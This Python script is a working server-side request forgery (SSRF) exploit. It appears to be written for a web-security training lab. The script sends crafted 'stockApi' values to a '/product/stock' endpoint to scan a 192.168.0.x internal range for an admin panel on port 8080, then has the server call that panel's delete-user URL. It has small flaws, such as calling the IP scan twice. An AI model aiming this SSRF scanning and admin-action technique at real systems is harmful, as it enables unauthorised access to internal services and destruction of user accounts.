import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https' :'http://127.0.0.1:8080' }

def del_user(url,admin_ip):
  check =  "/product/stock"
  params = {'stockApi':admin_ip+'/delete?username=wiener'}
  r = requests.post(url+check ,data=params,verify=False,proxies=proxies)
  check_admin= admin_ip
  params2 = {'stockApi': check_admin}
  r = requests.post(url + check, data=params2, verify=False, proxies=proxies)
  if 'User deleted successfully' in r.text:
      print("(+) Successfully deleted user")
  else:
      print("(-) Exploit was unsuccessful.")


def find_ip(url):
 check =  "/product/stock"
 for i in range(1,256):
  ip_range = "http://192.168.0.%s:8080/admin"%i
  params = {'stockApi':ip_range}
  r = requests.post(url+check ,data=params,verify=False,proxies=proxies)
  if r.status_code == 200:
   admin_ip = ip_range
   break
 if admin_ip == '':
  print("(-) Couldn't find ip address")
 return admin_ip

def main():
 if len(sys.argv) != 2:
  print("(+)Usage : python3 %s <url>"%sys.argv[0])
  sys.exit(-1)

 print("Finding IP Address")
 url = sys.argv[1]
 find_ip(url)
 admin_ip =  find_ip(url)
 del_user(url,admin_ip)

if __name__ == "__main__":
 main()
